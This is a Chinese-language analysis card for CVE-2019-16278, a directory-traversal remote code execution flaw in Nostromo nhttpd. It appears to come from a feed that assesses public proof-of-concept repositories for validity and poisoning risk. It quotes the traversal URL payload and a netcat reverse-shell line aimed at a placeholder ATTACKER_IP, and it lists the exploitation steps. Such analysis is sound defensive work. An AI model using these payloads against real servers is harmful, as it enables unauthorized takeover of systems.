## CVE-2019-16278-Nostromo-1.9.6-RCE

**漏洞编号:** CVE-2019-16278

**漏洞类型:** 目录遍历导致的远程代码执行

**影响应用:** Nostromo nhttpd

**危害等级:** 高危，可被利用进行远程代码执行

**影响版本:** <= 1.9.6

**利用条件:** 需要目标服务器运行存在漏洞的Nostromo nhttpd服务，且攻击者能够发起HTTP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-16278是Nostromo nhttpd 1.9.6及更早版本中`http_verify`函数中存在的目录遍历漏洞，允许攻击者通过精心构造的HTTP请求执行远程代码。

**有效性分析：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞是有效的。搜索引擎结果中Exploit-DB上也存在相关的利用代码，进一步证实了该漏洞的可利用性。POC代码的描述也表明，该脚本旨在利用此漏洞获得反向shell。

**投毒风险分析：**
提供的POC代码（`poc.py`）主要功能是构造包含目录遍历和命令执行的HTTP请求，并将其发送到目标服务器。代码中使用了`pwntools`库来建立网络连接和发送数据。其中关键部分是payload的构造：`URL = "/.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0"`，这部分通过目录遍历尝试访问`/bin/sh`。`reverse_shell = f"nc {ATTACKER_IP} {ATTACKER_PORT} -e /bin/sh"`，这部分是反向shell的命令，使用`netcat`将目标机器的`/bin/sh`绑定到攻击者的IP和端口。

代码本身没有明显的恶意行为或后门。风险主要来自于使用者是否在授权情况下使用该脚本。`README.md`中也声明了该脚本仅供教育和授权测试使用。

投毒风险评估为10%，主要考虑以下几点：
* 代码的可读性高，逻辑清晰，易于审查。
* 没有发现任何隐藏的恶意代码或后门。
* 代码的目的是为了利用已知的漏洞，而不是植入新的漏洞或后门。
* 风险主要在于使用者滥用该工具。

**利用方式：**
1.  攻击者需要找到运行着存在漏洞的Nostromo nhttpd 1.9.6或更早版本的服务器。
2.  攻击者需要准备一台具有公网IP的机器，并监听一个端口（例如4444）。
3.  攻击者运行提供的POC脚本，指定目标服务器的IP地址和端口，以及攻击者机器的IP地址和监听端口。
    ```bash
    python3 poc.py --target <目标IP> --port <目标端口> --attacker-ip <攻击者IP> --attacker-port <攻击者端口>
    ```
4.  POC脚本会构造一个包含目录遍历和反向shell命令的HTTP请求，并将其发送到目标服务器。
5.  如果漏洞利用成功，目标服务器会执行反向shell命令，将shell绑定到攻击者机器的指定端口。
6.  攻击者可以在攻击者机器上获得一个反向shell，从而控制目标服务器。

**项目地址:** [cancela24/CVE-2019-16278-Nostromo-1.9.6-RCE](https://github.com/cancela24/CVE-2019-16278-Nostromo-1.9.6-RCE)

**漏洞详情:** [CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)